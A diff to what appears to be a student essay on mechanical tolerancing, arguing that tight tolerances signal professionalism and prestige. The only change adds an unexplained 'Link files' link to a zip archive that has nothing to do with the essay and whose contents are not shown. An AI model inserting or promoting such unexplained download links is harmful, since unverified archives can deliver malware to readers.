@@ -188,4 +188,7 @@ When preforming tolerancing between 2 separate parts, I was strangely surprised 
 
 I believe that there is a linear relationship between tightness of tolerance and "professionalism." If a part needs to be designed within 0.0001in, that part most likely is being used in an extremely sensitive or high performance application, where anything short of actual perfection is unacceptable. Additionally, if a part is dimension to a precise enough, that would give the designer/company working on the part seem more "prestigious," effectively waving a sign saying "look at us, we're able to manufacturer something to this high of a standard of quality." While low tolerances and dimension conveys the exact opposite.
 
+[Link files](https://github.com/user-attachments/files/32910064/link.zip)
+
+
 
